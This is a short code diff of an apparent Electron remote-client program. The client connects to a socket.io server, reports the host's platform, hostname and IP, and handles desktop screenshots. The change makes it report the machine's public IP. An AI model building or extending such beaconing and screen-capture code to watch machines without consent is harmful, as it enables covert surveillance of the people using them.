@@ -3,7 +3,7 @@ const path = require('path')
 const io = require('socket.io-client')
 const socket = io('http://localhost:3000')
 const os = require('os')
-const ip = require('ip')
+const ip = require('public-ip')
 const scr = require('desktop-screenshot')
 const fs = require('fs')
 
@@ -27,7 +27,7 @@ function createWindow () {
   })
 
   socket.on('connect', function() {
-    socket.emit('new', {platform:os.platform(),arch:os.arch(),ip:ip.address(),hostname:os.hostname()})
+    socket.emit('new', {platform:os.platform(),arch:os.arch(),ip:ip.v4(),hostname:os.hostname()})
     setInterval(() => { socket.emit('ping', {hostname:os.hostname()}) }, 15);
     setInterval(() => {
       if(fs.existsSync(__dirname+'\\scr.png')) {
